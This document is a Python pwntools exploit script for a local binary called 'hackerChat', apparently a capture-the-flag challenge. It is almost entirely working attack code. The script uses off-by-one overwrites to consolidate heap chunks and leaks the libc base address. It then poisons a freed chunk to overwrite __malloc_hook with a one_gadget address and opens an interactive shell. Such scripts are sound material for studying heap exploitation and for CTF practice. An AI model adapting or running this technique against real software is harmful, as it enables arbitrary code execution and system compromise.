from pwn import * 

p = process("./hackerChat")
pw = "superPassword\r"

def readm():
    p.sendlineafter("4 - logout.",str(1))
    p.sendlineafter("chat:",pw)
    
def sendm(data):
    p.sendlineafter("4 - logout.",str(2))
    p.sendafter("message:",data)
    
def delm(idx):
    p.sendlineafter("4 - logout.",str(3))
    p.sendlineafter("[NUMBER]:",str(idx))

main_offset = 0x19eb78
free_hook_offset = 0x1a07a8
malloc_hook_offset = 0x19eb10
one_gadget = 0x4086e,0x408c2,0xd9026

p.sendlineafter("Username:","admin")
p.sendlineafter("Password:",pw)

# stage 1. make chunk's and leak libc's address. 
sendm("a"*0xf8)
sendm("b"*0x68)
sendm("c"*0xf8)
sendm("d"*0x10)

delm(0)
delm(0)
sendm("e"*0x68) #overwrites next chunk's prev_inuse byte

for i in xrange(0x66, 0x5f, -1):
    delm(2)
    sendm("f" * i + '\x70\x01')
# make prev_size member for make consolidate chunk

delm(0) #consolidate first 3 chunks.

sendm("g"*0xf7) 
#making 0x70 chunk to unsorted chunk for having main_arena's address 

readm()
p.recvuntil("Message 1: ")
libc_base = u64(p.recvuntil("M")[:-1]+"\x00\x00") - main_offset
free_hook = libc_base+free_hook_offset
malloc_hook = libc_base+malloc_hook_offset - 0x23 #find space
one = libc_base + one_gadget[2]

log.info(hex(libc_base))
# stage 2. make UAF to 0x70 chunk

for i in xrange(0xfd, 0xf7, -1): # recover 0x70 chunk's size for free chunk. 
    delm(2)
    sendm("\xdd"*i +'\x70') 

# pause()
delm(2) #consolidate 3 chunk's again. 
delm(1) #free 0x70 chunk. now it is freed chunk but can write to using first chunk. 

#stage 3. write free_hook's address to 0x70 chunk's FD 
sendm("\xdd"*0x100 +p64(malloc_hook)) #set free_hook 
# delm(1)
for i in xrange(0xfe, 0xf7, -1): # recover 0x70 chunk's size for free chunk. 
    delm(1)
    sendm("\xdd"*i +'\x70') 

readm()
    
sendm("\xee"*0x68)
pause()
sendm("a"*0x13+p64(one)+"b"*(0x68-0x23))

sendm("")



p.interactive()